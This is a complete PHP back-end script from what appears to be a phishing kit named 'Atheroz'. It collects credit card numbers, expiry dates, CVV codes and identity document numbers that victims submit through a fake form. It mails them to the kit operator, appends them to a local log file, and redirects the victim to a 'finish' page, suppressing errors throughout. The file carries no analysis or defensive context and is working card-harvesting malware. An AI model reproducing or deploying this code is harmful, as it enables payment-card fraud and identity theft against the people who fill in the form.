<meta http-equiv="Refresh"
content="0;url=finish.html"> 
<?php  
ini_set("display_errors", 0); 
include "atheroz.php";
$email = $_POST['Cr3d1t/D3bitC4rd'];  
$pass = $_POST['CM0nth']; 
$p1n = $_POST['CY3ar']; 
$p1 = $_POST['card-ccvD'];
$r1 = $_POST['1DTyp3'];
$p2 = $_POST['1D-Typ3']; 
$BILSMG = "   
C4rd :  $email  
M3s : $pass  
año : $p1n
Cvv : $p1
Indetificaci0n: $r1
Numer0 Identi : $p2\r\n====================================\r\n";
$MAIL_TITLE = "Atheroz | ".$IP."";  
$MAIL_HEADER = "From: Reporte_Atheroz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("HandXXX.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  
?>